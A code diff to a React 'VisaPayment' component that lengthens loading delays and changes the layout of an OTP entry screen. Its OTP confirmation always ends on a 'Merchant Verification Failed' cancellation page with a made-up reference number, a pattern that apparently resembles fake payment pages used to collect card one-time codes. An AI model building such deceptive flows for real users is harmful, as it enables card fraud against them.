@@ -152,7 +152,7 @@ const VisaPayment = () => {
       setIsLoading(false);
       setShowOtp(true);
       setOtpTimer(60);
-    }, 2000);
+    }, 4000);
   };
 
   const handleOtpConfirm = () => {
@@ -162,7 +162,7 @@ const VisaPayment = () => {
     setTimeout(() => {
       setOtpLoading(false);
       navigate(`/payment-cancelled?channel=Visa Card Payment&reason=Merchant Verification Failed&amount=${amount}.00&ref=VIS` + Date.now().toString().slice(-8));
-    }, 2500);
+    }, 5000);
   };
 
   const handleResendOtp = () => {
@@ -213,8 +213,8 @@ const VisaPayment = () => {
 
   if (showOtp) {
     return (
-      <div className="fixed inset-0 bg-gray-100 flex flex-col items-center justify-center p-4 overflow-hidden">
-        <div className="w-full max-w-md">
+      <div className="fixed inset-0 bg-gray-100 flex flex-col items-start justify-start p-4 pt-8 overflow-auto">
+        <div className="w-full max-w-md mx-auto">
           <div className="flex items-center justify-between mb-5">
             <button onClick={() => navigate(`/payment-cancelled?channel=Visa Card Payment&reason=Payment isn't completed&amount=${amount}.00`)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
               <ArrowLeft className="w-4 h-4" />
